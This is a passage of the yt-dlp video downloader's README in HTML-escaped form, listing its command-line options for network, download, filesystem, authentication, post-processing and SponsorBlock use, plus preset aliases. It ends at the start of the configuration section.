                                mini-language. E.g. --alias get-audio,-X "-S
                                aext:{0},abr -x --audio-format {0}" creates
                                options "--get-audio" and "-X" that takes an
                                argument (ARG0) and expands to "-S
                                aext:ARG0,abr -x --audio-format ARG0". All
                                defined aliases are listed in the --help
                                output. Alias options can trigger more
                                aliases; so be careful to avoid defining
                                recursive options. As a safety measure, each
                                alias may be triggered a maximum of 100
                                times. This option can be used multiple times
-t, --preset-alias PRESET       Applies a predefined set of options. e.g.
                                --preset-alias mp3. The following presets
                                are available: mp3, aac, mp4, mkv, sleep.
                                See the "Preset Aliases" section at the end
                                for more info. This option can be used
                                multiple times
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Network Options:&lt;/h2&gt; 
&lt;pre&gt;&lt;code&gt;--proxy URL                     Use the specified HTTP/HTTPS/SOCKS proxy. To
                                enable SOCKS proxy, specify a proper scheme,
                                e.g. socks5://user:pass@127.0.0.1:1080/.
                                Pass in an empty string (--proxy "") for
                                direct connection
--socket-timeout SECONDS        Time to wait before giving up, in seconds
--source-address IP             Client-side IP address to bind to
--impersonate CLIENT[:OS]       Client to impersonate for requests. E.g.
                                chrome, chrome-110, chrome:windows-10. Pass
                                --impersonate="" to impersonate any client.
                                Note that forcing impersonation for all
                                requests may have a detrimental impact on
                                download speed and stability
--list-impersonate-targets      List available clients to impersonate.
-4, --force-ipv4                Make all connections via IPv4
-6, --force-ipv6                Make all connections via IPv6
--enable-file-urls              Enable file:// URLs. This is disabled by
                                default for security reasons.
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Geo-restriction:&lt;/h2&gt; 
&lt;pre&gt;&lt;code&gt;--geo-verification-proxy URL    Use this proxy to verify the IP address for
                                some geo-restricted sites. The default proxy
                                specified by --proxy (or none, if the option
                                is not present) is used for the actual
                                downloading
--xff VALUE                     How to fake X-Forwarded-For HTTP header to
                                try bypassing geographic restriction. One of
                                "default" (only when known to be useful),
                                "never", an IP block in CIDR notation, or a
                                two-letter ISO 3166-2 country code
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Video Selection:&lt;/h2&gt; 
&lt;pre&gt;&lt;code&gt;-I, --playlist-items ITEM_SPEC  Comma-separated playlist_index of the items
                                to download. You can specify a range using
                                "[START]:[STOP][:STEP]". For backward
                                compatibility, START-STOP is also supported.
                                Use negative indices to count from the right
                                and negative STEP to download in reverse
                                order. E.g. "-I 1:3,7,-5::2" used on a
                                playlist of size 15 will download the items
                                at index 1,2,3,7,11,13,15
--min-filesize SIZE             Abort download if filesize is smaller than
                                SIZE, e.g. 50k or 44.6M
--max-filesize SIZE             Abort download if filesize is larger than
                                SIZE, e.g. 50k or 44.6M
--date DATE                     Download only videos uploaded on this date.
                                The date can be "YYYYMMDD" or in the format 
                                [now|today|yesterday][-N[day|week|month|year]].
                                E.g. "--date today-2weeks" downloads only
                                videos uploaded on the same day two weeks ago
--datebefore DATE               Download only videos uploaded on or before
                                this date. The date formats accepted are the
                                same as --date
--dateafter DATE                Download only videos uploaded on or after
                                this date. The date formats accepted are the
                                same as --date
--match-filters FILTER          Generic video filter. Any "OUTPUT TEMPLATE"
                                field can be compared with a number or a
                                string using the operators defined in
                                "Filtering Formats". You can also simply
                                specify a field to match if the field is
                                present, use "!field" to check if the field
                                is not present, and "&amp;amp;" to check multiple
                                conditions. Use a "\" to escape "&amp;amp;" or
                                quotes if needed. If used multiple times,
                                the filter matches if at least one of the
                                conditions is met. E.g. --match-filters
                                !is_live --match-filters "like_count&amp;gt;?100 &amp;amp;
                                description~='(?i)\bcats \&amp;amp; dogs\b'" matches
                                only videos that are not live OR those that
                                have a like count more than 100 (or the like
                                field is not available) and also has a
                                description that contains the phrase "cats &amp;amp;
                                dogs" (caseless). Use "--match-filters -" to
                                interactively ask whether to download each
                                video
--no-match-filters              Do not use any --match-filters (default)
--break-match-filters FILTER    Same as "--match-filters" but stops the
                                download process when a video is rejected
--no-break-match-filters        Do not use any --break-match-filters (default)
--no-playlist                   Download only the video, if the URL refers
                                to a video and a playlist
--yes-playlist                  Download the playlist, if the URL refers to
                                a video and a playlist
--age-limit YEARS               Download only videos suitable for the given
                                age
--download-archive FILE         Download only videos not listed in the
                                archive file. Record the IDs of all
                                downloaded videos in it
--no-download-archive           Do not use archive file (default)
--max-downloads NUMBER          Abort after downloading NUMBER files
--break-on-existing             Stop the download process when encountering
                                a file that is in the archive supplied with
                                the --download-archive option
--no-break-on-existing          Do not stop the download process when
                                encountering a file that is in the archive
                                (default)
--break-per-input               Alters --max-downloads, --break-on-existing,
                                --break-match-filters, and autonumber to
                                reset per input URL
--no-break-per-input            --break-on-existing and similar options
                                terminates the entire download queue
--skip-playlist-after-errors N  Number of allowed failures until the rest of
                                the playlist is skipped
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Download Options:&lt;/h2&gt; 
&lt;pre&gt;&lt;code&gt;-N, --concurrent-fragments N    Number of fragments of a dash/hlsnative
                                video that should be downloaded concurrently
                                (default is 1)
-r, --limit-rate RATE           Maximum download rate in bytes per second,
                                e.g. 50K or 4.2M
--throttled-rate RATE           Minimum download rate in bytes per second
                                below which throttling is assumed and the
                                video data is re-extracted, e.g. 100K
-R, --retries RETRIES           Number of retries (default is 10), or
                                "infinite"
--file-access-retries RETRIES   Number of times to retry on file access
                                error (default is 3), or "infinite"
--fragment-retries RETRIES      Number of retries for a fragment (default is
                                10), or "infinite" (DASH, hlsnative and ISM)
--retry-sleep [TYPE:]EXPR       Time to sleep between retries in seconds
                                (optionally) prefixed by the type of retry
                                (http (default), fragment, file_access,
                                extractor) to apply the sleep to. EXPR can
                                be a number, linear=START[:END[:STEP=1]] or
                                exp=START[:END[:BASE=2]]. This option can be
                                used multiple times to set the sleep for the
                                different retry types, e.g. --retry-sleep
                                linear=1::2 --retry-sleep fragment:exp=1:20
--skip-unavailable-fragments    Skip unavailable fragments for DASH,
                                hlsnative and ISM downloads (default)
                                (Alias: --no-abort-on-unavailable-fragments)
--abort-on-unavailable-fragments
                                Abort download if a fragment is unavailable
                                (Alias: --no-skip-unavailable-fragments)
--keep-fragments                Keep downloaded fragments on disk after
                                downloading is finished
--no-keep-fragments             Delete downloaded fragments after
                                downloading is finished (default)
--buffer-size SIZE              Size of download buffer, e.g. 1024 or 16K
                                (default is 1024)
--resize-buffer                 The buffer size is automatically resized
                                from an initial value of --buffer-size
                                (default)
--no-resize-buffer              Do not automatically adjust the buffer size
--http-chunk-size SIZE          Size of a chunk for chunk-based HTTP
                                downloading, e.g. 10485760 or 10M (default
                                is disabled). May be useful for bypassing
                                bandwidth throttling imposed by a webserver
                                (experimental)
--playlist-random               Download playlist videos in random order
--lazy-playlist                 Process entries in the playlist as they are
                                received. This disables n_entries,
                                --playlist-random and --playlist-reverse
--no-lazy-playlist              Process videos in the playlist only after
                                the entire playlist is parsed (default)
--hls-use-mpegts                Use the mpegts container for HLS videos;
                                allowing some players to play the video
                                while downloading, and reducing the chance
                                of file corruption if download is
                                interrupted. This is enabled by default for
                                live streams
--no-hls-use-mpegts             Do not use the mpegts container for HLS
                                videos. This is default when not downloading
                                live streams
--download-sections REGEX       Download only chapters that match the
                                regular expression. A "*" prefix denotes
                                time-range instead of chapter. Negative
                                timestamps are calculated from the end.
                                "*from-url" can be used to download between
                                the "start_time" and "end_time" extracted
                                from the URL. Needs ffmpeg. This option can
                                be used multiple times to download multiple
                                sections, e.g. --download-sections
                                "*10:15-inf" --download-sections "intro"
--downloader [PROTO:]NAME       Name or path of the external downloader to
                                use (optionally) prefixed by the protocols
                                (http, ftp, m3u8, dash, rstp, rtmp, mms) to
                                use it for. Currently supports native,
                                aria2c, axel, curl, ffmpeg, httpie, wget.
                                You can use this option multiple times to
                                set different downloaders for different
                                protocols. E.g. --downloader aria2c
                                --downloader "dash,m3u8:native" will use
                                aria2c for http/ftp downloads, and the
                                native downloader for dash/m3u8 downloads
                                (Alias: --external-downloader)
--downloader-args NAME:ARGS     Give these arguments to the external
                                downloader. Specify the downloader name and
                                the arguments separated by a colon ":". For
                                ffmpeg, arguments can be passed to different
                                positions using the same syntax as
                                --postprocessor-args. You can use this
                                option multiple times to give different
                                arguments to different downloaders (Alias:
                                --external-downloader-args)
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Filesystem Options:&lt;/h2&gt; 
&lt;pre&gt;&lt;code&gt;-a, --batch-file FILE           File containing URLs to download ("-" for
                                stdin), one URL per line. Lines starting
                                with "#", ";" or "]" are considered as
                                comments and ignored
--no-batch-file                 Do not read URLs from batch file (default)
-P, --paths [TYPES:]PATH        The paths where the files should be
                                downloaded. Specify the type of file and the
                                path separated by a colon ":". All the same
                                TYPES as --output are supported.
                                Additionally, you can also provide "home"
                                (default) and "temp" paths. All intermediary
                                files are first downloaded to the temp path
                                and then the final files are moved over to
                                the home path after download is finished.
                                This option is ignored if --output is an
                                absolute path
-o, --output [TYPES:]TEMPLATE   Output filename template; see "OUTPUT
                                TEMPLATE" for details
--output-na-placeholder TEXT    Placeholder for unavailable fields in
                                --output (default: "NA")
--restrict-filenames            Restrict filenames to only ASCII characters,
                                and avoid "&amp;amp;" and spaces in filenames
--no-restrict-filenames         Allow Unicode characters, "&amp;amp;" and spaces in
                                filenames (default)
--windows-filenames             Force filenames to be Windows-compatible
--no-windows-filenames          Sanitize filenames only minimally
--trim-filenames LENGTH         Limit the filename length (excluding
                                extension) to the specified number of
                                characters
-w, --no-overwrites             Do not overwrite any files
--force-overwrites              Overwrite all video and metadata files. This
                                option includes --no-continue
--no-force-overwrites           Do not overwrite the video, but overwrite
                                related files (default)
-c, --continue                  Resume partially downloaded files/fragments
                                (default)
--no-continue                   Do not resume partially downloaded
                                fragments. If the file is not fragmented,
                                restart download of the entire file
--part                          Use .part files instead of writing directly
                                into output file (default)
--no-part                       Do not use .part files - write directly into
                                output file
--mtime                         Use the Last-modified header to set the file
                                modification time
--no-mtime                      Do not use the Last-modified header to set
                                the file modification time (default)
--write-description             Write video description to a .description file
--no-write-description          Do not write video description (default)
--write-info-json               Write video metadata to a .info.json file
                                (this may contain personal information)
--no-write-info-json            Do not write video metadata (default)
--write-playlist-metafiles      Write playlist metadata in addition to the
                                video metadata when using --write-info-json,
                                --write-description etc. (default)
--no-write-playlist-metafiles   Do not write playlist metadata when using
                                --write-info-json, --write-description etc.
--clean-info-json               Remove some internal metadata such as
                                filenames from the infojson (default)
--no-clean-info-json            Write all fields to the infojson
--write-comments                Retrieve video comments to be placed in the
                                infojson. The comments are fetched even
                                without this option if the extraction is
                                known to be quick (Alias: --get-comments)
--no-write-comments             Do not retrieve video comments unless the
                                extraction is known to be quick (Alias:
                                --no-get-comments)
--load-info-json FILE           JSON file containing the video information
                                (created with the "--write-info-json" option)
--cookies FILE                  Netscape formatted file to read cookies from
                                and dump cookie jar in
--no-cookies                    Do not read/dump cookies from/to file
                                (default)
--cookies-from-browser BROWSER[+KEYRING][:PROFILE][::CONTAINER]
                                The name of the browser to load cookies
                                from. Currently supported browsers are:
                                brave, chrome, chromium, edge, firefox,
                                opera, safari, vivaldi, whale. Optionally,
                                the KEYRING used for decrypting Chromium
                                cookies on Linux, the name/path of the
                                PROFILE to load cookies from, and the
                                CONTAINER name (if Firefox) ("none" for no
                                container) can be given with their
                                respective separators. By default, all
                                containers of the most recently accessed
                                profile are used. Currently supported
                                keyrings are: basictext, gnomekeyring,
                                kwallet, kwallet5, kwallet6
--no-cookies-from-browser       Do not load cookies from browser (default)
--cache-dir DIR                 Location in the filesystem where yt-dlp can
                                store some downloaded information (such as
                                client ids and signatures) permanently. By
                                default ${XDG_CACHE_HOME}/yt-dlp
--no-cache-dir                  Disable filesystem caching
--rm-cache-dir                  Delete all filesystem cache files
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Thumbnail Options:&lt;/h2&gt; 
&lt;pre&gt;&lt;code&gt;--write-thumbnail               Write thumbnail image to disk
--no-write-thumbnail            Do not write thumbnail image to disk (default)
--write-all-thumbnails          Write all thumbnail image formats to disk
--list-thumbnails               List available thumbnails of each video.
                                Simulate unless --no-simulate is used
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Internet Shortcut Options:&lt;/h2&gt; 
&lt;pre&gt;&lt;code&gt;--write-link                    Write an internet shortcut file, depending
                                on the current platform (.url, .webloc or
                                .desktop). The URL may be cached by the OS
--write-url-link                Write a .url Windows internet shortcut. The
                                OS caches the URL based on the file path
--write-webloc-link             Write a .webloc macOS internet shortcut
--write-desktop-link            Write a .desktop Linux internet shortcut
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Verbosity and Simulation Options:&lt;/h2&gt; 
&lt;pre&gt;&lt;code&gt;-q, --quiet                     Activate quiet mode. If used with --verbose,
                                print the log to stderr
--no-quiet                      Deactivate quiet mode. (Default)
--no-warnings                   Ignore warnings
-s, --simulate                  Do not download the video and do not write
                                anything to disk
--no-simulate                   Download the video even if printing/listing
                                options are used
--ignore-no-formats-error       Ignore "No video formats" error. Useful for
                                extracting metadata even if the videos are
                                not actually available for download
                                (experimental)
--no-ignore-no-formats-error    Throw error when no downloadable video
                                formats are found (default)
--skip-download                 Do not download the video but write all
                                related files (Alias: --no-download)
-O, --print [WHEN:]TEMPLATE     Field name or output template to print to
                                screen, optionally prefixed with when to
                                print it, separated by a ":". Supported
                                values of "WHEN" are the same as that of
                                --use-postprocessor (default: video).
                                Implies --quiet. Implies --simulate unless
                                --no-simulate or later stages of WHEN are
                                used. This option can be used multiple times
--print-to-file [WHEN:]TEMPLATE FILE
                                Append given template to the file. The
                                values of WHEN and TEMPLATE are the same as
                                that of --print. FILE uses the same syntax
                                as the output template. This option can be
                                used multiple times
-j, --dump-json                 Quiet, but print JSON information for each
                                video. Simulate unless --no-simulate is
                                used. See "OUTPUT TEMPLATE" for a
                                description of available keys
-J, --dump-single-json          Quiet, but print JSON information for each
                                URL or infojson passed. Simulate unless
                                --no-simulate is used. If the URL refers to
                                a playlist, the whole playlist information
                                is dumped in a single line
--force-write-archive           Force download archive entries to be written
                                as far as no errors occur, even if -s or
                                another simulation option is used (Alias:
                                --force-download-archive)
--newline                       Output progress bar as new lines
--no-progress                   Do not print progress bar
--progress                      Show progress bar, even if in quiet mode
--console-title                 Display progress in console titlebar
--progress-template [TYPES:]TEMPLATE
                                Template for progress outputs, optionally
                                prefixed with one of "download:" (default),
                                "download-title:" (the console title),
                                "postprocess:",  or "postprocess-title:".
                                The video's fields are accessible under the
                                "info" key and the progress attributes are
                                accessible under "progress" key. E.g.
                                --console-title --progress-template
                                "download-title:%(info.id)s-%(progress.eta)s"
--progress-delta SECONDS        Time between progress output (default: 0)
-v, --verbose                   Print various debugging information
--dump-pages                    Print downloaded pages encoded using base64
                                to debug problems (very verbose)
--write-pages                   Write downloaded intermediary pages to files
                                in the current directory to debug problems
--print-traffic                 Display sent and read HTTP traffic
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Workarounds:&lt;/h2&gt; 
&lt;pre&gt;&lt;code&gt;--encoding ENCODING             Force the specified encoding (experimental)
--legacy-server-connect         Explicitly allow HTTPS connection to servers
                                that do not support RFC 5746 secure
                                renegotiation
--no-check-certificates         Suppress HTTPS certificate validation
--prefer-insecure               Use an unencrypted connection to retrieve
                                information about the video (Currently
                                supported only for YouTube)
--add-headers FIELD:VALUE       Specify a custom HTTP header and its value,
                                separated by a colon ":". You can use this
                                option multiple times
--bidi-workaround               Work around terminals that lack
                                bidirectional text support. Requires bidiv
                                or fribidi executable in PATH
--sleep-requests SECONDS        Number of seconds to sleep between requests
                                during data extraction
--sleep-interval SECONDS        Number of seconds to sleep before each
                                download. This is the minimum time to sleep
                                when used along with --max-sleep-interval
                                (Alias: --min-sleep-interval)
--max-sleep-interval SECONDS    Maximum number of seconds to sleep. Can only
                                be used along with --min-sleep-interval
--sleep-subtitles SECONDS       Number of seconds to sleep before each
                                subtitle download
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Video Format Options:&lt;/h2&gt; 
&lt;pre&gt;&lt;code&gt;-f, --format FORMAT             Video format code, see "FORMAT SELECTION"
                                for more details
-S, --format-sort SORTORDER     Sort the formats by the fields given, see
                                "Sorting Formats" for more details
--format-sort-reset             Disregard previous user specified sort order
                                and reset to the default
--format-sort-force             Force user specified sort order to have
                                precedence over all fields, see "Sorting
                                Formats" for more details (Alias: --S-force)
--no-format-sort-force          Some fields have precedence over the user
                                specified sort order (default)
--video-multistreams            Allow multiple video streams to be merged
                                into a single file
--no-video-multistreams         Only one video stream is downloaded for each
                                output file (default)
--audio-multistreams            Allow multiple audio streams to be merged
                                into a single file
--no-audio-multistreams         Only one audio stream is downloaded for each
                                output file (default)
--prefer-free-formats           Prefer video formats with free containers
                                over non-free ones of the same quality. Use
                                with "-S ext" to strictly prefer free
                                containers irrespective of quality
--no-prefer-free-formats        Don't give any special preference to free
                                containers (default)
--check-formats                 Make sure formats are selected only from
                                those that are actually downloadable
--check-all-formats             Check all formats for whether they are
                                actually downloadable
--no-check-formats              Do not check that the formats are actually
                                downloadable
-F, --list-formats              List available formats of each video.
                                Simulate unless --no-simulate is used
--merge-output-format FORMAT    Containers that may be used when merging
                                formats, separated by "/", e.g. "mp4/mkv".
                                Ignored if no merge is required. (currently
                                supported: avi, flv, mkv, mov, mp4, webm)
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Subtitle Options:&lt;/h2&gt; 
&lt;pre&gt;&lt;code&gt;--write-subs                    Write subtitle file
--no-write-subs                 Do not write subtitle file (default)
--write-auto-subs               Write automatically generated subtitle file
                                (Alias: --write-automatic-subs)
--no-write-auto-subs            Do not write auto-generated subtitles
                                (default) (Alias: --no-write-automatic-subs)
--list-subs                     List available subtitles of each video.
                                Simulate unless --no-simulate is used
--sub-format FORMAT             Subtitle format; accepts formats preference
                                separated by "/", e.g. "srt" or "ass/srt/best"
--sub-langs LANGS               Languages of the subtitles to download (can
                                be regex) or "all" separated by commas, e.g.
                                --sub-langs "en.*,ja" (where "en.*" is a
                                regex pattern that matches "en" followed by
                                0 or more of any character). You can prefix
                                the language code with a "-" to exclude it
                                from the requested languages, e.g. --sub-
                                langs all,-live_chat. Use --list-subs for a
                                list of available language tags
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Authentication Options:&lt;/h2&gt; 
&lt;pre&gt;&lt;code&gt;-u, --username USERNAME         Login with this account ID
-p, --password PASSWORD         Account password. If this option is left
                                out, yt-dlp will ask interactively
-2, --twofactor TWOFACTOR       Two-factor authentication code
-n, --netrc                     Use .netrc authentication data
--netrc-location PATH           Location of .netrc authentication data;
                                either the path or its containing directory.
                                Defaults to ~/.netrc
--netrc-cmd NETRC_CMD           Command to execute to get the credentials
                                for an extractor.
--video-password PASSWORD       Video-specific password
--ap-mso MSO                    Adobe Pass multiple-system operator (TV
                                provider) identifier, use --ap-list-mso for
                                a list of available MSOs
--ap-username USERNAME          Multiple-system operator account login
--ap-password PASSWORD          Multiple-system operator account password.
                                If this option is left out, yt-dlp will ask
                                interactively
--ap-list-mso                   List all supported multiple-system operators
--client-certificate CERTFILE   Path to client certificate file in PEM
                                format. May include the private key
--client-certificate-key KEYFILE
                                Path to private key file for client
                                certificate
--client-certificate-password PASSWORD
                                Password for client certificate private key,
                                if encrypted. If not provided, and the key
                                is encrypted, yt-dlp will ask interactively
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Post-Processing Options:&lt;/h2&gt; 
&lt;pre&gt;&lt;code&gt;-x, --extract-audio             Convert video files to audio-only files
                                (requires ffmpeg and ffprobe)
--audio-format FORMAT           Format to convert the audio to when -x is
                                used. (currently supported: best (default),
                                aac, alac, flac, m4a, mp3, opus, vorbis,
                                wav). You can specify multiple rules using
                                similar syntax as --remux-video
--audio-quality QUALITY         Specify ffmpeg audio quality to use when
                                converting the audio with -x. Insert a value
                                between 0 (best) and 10 (worst) for VBR or a
                                specific bitrate like 128K (default 5)
--remux-video FORMAT            Remux the video into another container if
                                necessary (currently supported: avi, flv,
                                gif, mkv, mov, mp4, webm, aac, aiff, alac,
                                flac, m4a, mka, mp3, ogg, opus, vorbis,
                                wav). If the target container does not
                                support the video/audio codec, remuxing will
                                fail. You can specify multiple rules; e.g.
                                "aac&amp;gt;m4a/mov&amp;gt;mp4/mkv" will remux aac to m4a,
                                mov to mp4 and anything else to mkv
--recode-video FORMAT           Re-encode the video into another format if
                                necessary. The syntax and supported formats
                                are the same as --remux-video
--postprocessor-args NAME:ARGS  Give these arguments to the postprocessors.
                                Specify the postprocessor/executable name
                                and the arguments separated by a colon ":"
                                to give the argument to the specified
                                postprocessor/executable. Supported PP are:
                                Merger, ModifyChapters, SplitChapters,
                                ExtractAudio, VideoRemuxer, VideoConvertor,
                                Metadata, EmbedSubtitle, EmbedThumbnail,
                                SubtitlesConvertor, ThumbnailsConvertor,
                                FixupStretched, FixupM4a, FixupM3u8,
                                FixupTimestamp and FixupDuration. The
                                supported executables are: AtomicParsley,
                                FFmpeg and FFprobe. You can also specify
                                "PP+EXE:ARGS" to give the arguments to the
                                specified executable only when being used by
                                the specified postprocessor. Additionally,
                                for ffmpeg/ffprobe, "_i"/"_o" can be
                                appended to the prefix optionally followed
                                by a number to pass the argument before the
                                specified input/output file, e.g. --ppa
                                "Merger+ffmpeg_i1:-v quiet". You can use
                                this option multiple times to give different
                                arguments to different postprocessors.
                                (Alias: --ppa)
-k, --keep-video                Keep the intermediate video file on disk
                                after post-processing
--no-keep-video                 Delete the intermediate video file after
                                post-processing (default)
--post-overwrites               Overwrite post-processed files (default)
--no-post-overwrites            Do not overwrite post-processed files
--embed-subs                    Embed subtitles in the video (only for mp4,
                                webm and mkv videos)
--no-embed-subs                 Do not embed subtitles (default)
--embed-thumbnail               Embed thumbnail in the video as cover art
--no-embed-thumbnail            Do not embed thumbnail (default)
--embed-metadata                Embed metadata to the video file. Also
                                embeds chapters/infojson if present unless
                                --no-embed-chapters/--no-embed-info-json are
                                used (Alias: --add-metadata)
--no-embed-metadata             Do not add metadata to file (default)
                                (Alias: --no-add-metadata)
--embed-chapters                Add chapter markers to the video file
                                (Alias: --add-chapters)
--no-embed-chapters             Do not add chapter markers (default) (Alias:
                                --no-add-chapters)
--embed-info-json               Embed the infojson as an attachment to
                                mkv/mka video files
--no-embed-info-json            Do not embed the infojson as an attachment
                                to the video file
--parse-metadata [WHEN:]FROM:TO
                                Parse additional metadata like title/artist
                                from other fields; see "MODIFYING METADATA"
                                for details. Supported values of "WHEN" are
                                the same as that of --use-postprocessor
                                (default: pre_process)
--replace-in-metadata [WHEN:]FIELDS REGEX REPLACE
                                Replace text in a metadata field using the
                                given regex. This option can be used
                                multiple times. Supported values of "WHEN"
                                are the same as that of --use-postprocessor
                                (default: pre_process)
--xattrs                        Write metadata to the video file's xattrs
                                (using Dublin Core and XDG standards)
--concat-playlist POLICY        Concatenate videos in a playlist. One of
                                "never", "always", or "multi_video"
                                (default; only when the videos form a single
                                show). All the video files must have the
                                same codecs and number of streams to be
                                concatenable. The "pl_video:" prefix can be
                                used with "--paths" and "--output" to set
                                the output filename for the concatenated
                                files. See "OUTPUT TEMPLATE" for details
--fixup POLICY                  Automatically correct known faults of the
                                file. One of never (do nothing), warn (only
                                emit a warning), detect_or_warn (the
                                default; fix the file if we can, warn
                                otherwise), force (try fixing even if the
                                file already exists)
--ffmpeg-location PATH          Location of the ffmpeg binary; either the
                                path to the binary or its containing directory
--exec [WHEN:]CMD               Execute a command, optionally prefixed with
                                when to execute it, separated by a ":".
                                Supported values of "WHEN" are the same as
                                that of --use-postprocessor (default:
                                after_move). The same syntax as the output
                                template can be used to pass any field as
                                arguments to the command. If no fields are
                                passed, %(filepath,_filename|)q is appended
                                to the end of the command. This option can
                                be used multiple times
--no-exec                       Remove any previously defined --exec
--convert-subs FORMAT           Convert the subtitles to another format
                                (currently supported: ass, lrc, srt, vtt).
                                Use "--convert-subs none" to disable
                                conversion (default) (Alias: --convert-
                                subtitles)
--convert-thumbnails FORMAT     Convert the thumbnails to another format
                                (currently supported: jpg, png, webp). You
                                can specify multiple rules using similar
                                syntax as "--remux-video". Use "--convert-
                                thumbnails none" to disable conversion
                                (default)
--split-chapters                Split video into multiple files based on
                                internal chapters. The "chapter:" prefix can
                                be used with "--paths" and "--output" to set
                                the output filename for the split files. See
                                "OUTPUT TEMPLATE" for details
--no-split-chapters             Do not split video based on chapters (default)
--remove-chapters REGEX         Remove chapters whose title matches the
                                given regular expression. The syntax is the
                                same as --download-sections. This option can
                                be used multiple times
--no-remove-chapters            Do not remove any chapters from the file
                                (default)
--force-keyframes-at-cuts       Force keyframes at cuts when
                                downloading/splitting/removing sections.
                                This is slow due to needing a re-encode, but
                                the resulting video may have fewer artifacts
                                around the cuts
--no-force-keyframes-at-cuts    Do not force keyframes around the chapters
                                when cutting/splitting (default)
--use-postprocessor NAME[:ARGS]
                                The (case-sensitive) name of plugin
                                postprocessors to be enabled, and
                                (optionally) arguments to be passed to it,
                                separated by a colon ":". ARGS are a
                                semicolon ";" delimited list of NAME=VALUE.
                                The "when" argument determines when the
                                postprocessor is invoked. It can be one of
                                "pre_process" (after video extraction),
                                "after_filter" (after video passes filter),
                                "video" (after --format; before
                                --print/--output), "before_dl" (before each
                                video download), "post_process" (after each
                                video download; default), "after_move"
                                (after moving the video file to its final
                                location), "after_video" (after downloading
                                and processing all formats of a video), or
                                "playlist" (at end of playlist). This option
                                can be used multiple times to add different
                                postprocessors
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;SponsorBlock Options:&lt;/h2&gt; 
&lt;p&gt;Make chapter entries for, or remove various segments (sponsor, introductions, etc.) from downloaded YouTube videos using the &lt;a href="https://sponsor.ajay.app"&gt;SponsorBlock API&lt;/a&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;--sponsorblock-mark CATS        SponsorBlock categories to create chapters
                                for, separated by commas. Available
                                categories are sponsor, intro, outro,
                                selfpromo, preview, filler, interaction,
                                music_offtopic, hook, poi_highlight,
                                chapter, all and default (=all). You can
                                prefix the category with a "-" to exclude
                                it. See [1] for descriptions of the
                                categories. E.g. --sponsorblock-mark
                                all,-preview
                                [1] https://wiki.sponsor.ajay.app/w/Segment_Categories
--sponsorblock-remove CATS      SponsorBlock categories to be removed from
                                the video file, separated by commas. If a
                                category is present in both mark and remove,
                                remove takes precedence. The syntax and
                                available categories are the same as for
                                --sponsorblock-mark except that "default"
                                refers to "all,-filler" and poi_highlight,
                                chapter are not available
--sponsorblock-chapter-title TEMPLATE
                                An output template for the title of the
                                SponsorBlock chapters created by
                                --sponsorblock-mark. The only available
                                fields are start_time, end_time, category,
                                categories, name, category_names. Defaults
                                to "[SponsorBlock]: %(category_names)l"
--no-sponsorblock               Disable both --sponsorblock-mark and
                                --sponsorblock-remove
--sponsorblock-api URL          SponsorBlock API location, defaults to
                                https://sponsor.ajay.app
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Extractor Options:&lt;/h2&gt; 
&lt;pre&gt;&lt;code&gt;--extractor-retries RETRIES     Number of retries for known extractor errors
                                (default is 3), or "infinite"
--allow-dynamic-mpd             Process dynamic DASH manifests (default)
                                (Alias: --no-ignore-dynamic-mpd)
--ignore-dynamic-mpd            Do not process dynamic DASH manifests
                                (Alias: --no-allow-dynamic-mpd)
--hls-split-discontinuity       Split HLS playlists to different formats at
                                discontinuities such as ad breaks
--no-hls-split-discontinuity    Do not split HLS playlists into different
                                formats at discontinuities such as ad breaks
                                (default)
--extractor-args IE_KEY:ARGS    Pass ARGS arguments to the IE_KEY extractor.
                                See "EXTRACTOR ARGUMENTS" for details. You
                                can use this option multiple times to give
                                arguments for different extractors
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Preset Aliases:&lt;/h2&gt; 
&lt;p&gt;Predefined aliases for convenience and ease of use. Note that future versions of yt-dlp may add or adjust presets, but the existing preset names will not be changed or removed&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;-t mp3                          -f 'ba[acodec^=mp3]/ba/b' -x --audio-format
                                mp3

-t aac                          -f
                                'ba[acodec^=aac]/ba[acodec^=mp4a.40.]/ba/b'
                                -x --audio-format aac

-t mp4                          --merge-output-format mp4 --remux-video mp4
                                -S vcodec:h264,lang,quality,res,fps,hdr:12,a
                                codec:aac

-t mkv                          --merge-output-format mkv --remux-video mkv

-t sleep                        --sleep-subtitles 5 --sleep-requests 0.75
                                --sleep-interval 10 --max-sleep-interval 20
&lt;/code&gt;&lt;/pre&gt; 
&lt;h1&gt;CONFIGURATION&lt;/h1&gt; 
&lt;p&gt;You can configure yt-dlp by placing any supported command line option in a configuration file. The configuration is loaded from the following locations:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Main Configuration&lt;/strong&gt;:&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;The file given to &lt;code&gt;--config-locations&lt;/code&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Portable Configuration&lt;/strong&gt;: (Recommended for portable installations)&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;If using a binary, &lt;code&gt;yt-dlp.conf&lt;/code&gt; in the same directory as the binary&lt;/li&gt; 
   &lt;li&gt;If running from source-code, &lt;code&gt;yt-dlp.conf&lt;/code&gt; in the parent directory of &lt;code&gt;yt_dlp&lt;/code&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Home Configuration&lt;/strong&gt;:&lt;/p&gt; 
  &lt;ul&gt; 
